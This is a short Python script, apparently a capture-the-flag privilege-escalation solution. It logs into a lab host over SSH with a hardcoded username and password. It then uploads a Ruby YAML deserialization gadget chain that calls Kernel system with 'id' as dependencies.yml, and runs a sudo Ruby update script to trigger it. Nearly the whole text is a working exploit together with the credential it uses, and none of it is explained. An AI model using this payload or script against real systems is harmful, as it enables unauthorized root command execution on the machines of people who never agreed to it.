import paramiko
host='10.129.108.65'; user='henry'; pw='Q3c1AqGHtoI0aXAYFH'
payload='''--- !ruby/object:Gem::Requirement
requirements:
- !ruby/object:Gem::SpecFetcher {}
- !ruby/object:Gem::Installer {}
- !ruby/object:Gem::Package::TarReader
  io: !ruby/object:Net::BufferedIO
    io: !ruby/object:Gem::Package::TarReader::Entry
      read: 0
      header: x
    debug_output: !ruby/object:Net::WriteAdapter
      socket: !ruby/object:Gem::RequestSet
        sets: !ruby/object:Net::WriteAdapter
          socket: !ruby/object:Kernel
          method_id: :system
        git_set: !ruby/object:Gem::Package::TarReader::Entry
          read: 0
          header: id
      method_id: :resolve
'''
c=paramiko.SSHClient(); c.set_missing_host_key_policy(paramiko.AutoAddPolicy()); c.connect(host,username=user,password=pw,timeout=8)
s=c.open_sftp(); s.file('/home/henry/dependencies.yml','w').write(payload); s.close()
cmd="cd /home/henry && sudo /usr/bin/ruby /opt/update_dependencies.rb 2>&1"
c=paramiko.SSHClient(); c.set_missing_host_key_policy(paramiko.AutoAddPolicy()); c.connect(host,username=user,password=pw,timeout=8)
stdin,stdout,stderr=c.exec_command(cmd,timeout=20)
print(stdout.read().decode(errors='replace')[:4000]); print(stderr.read().decode(errors='replace')[:2000])
c.close()
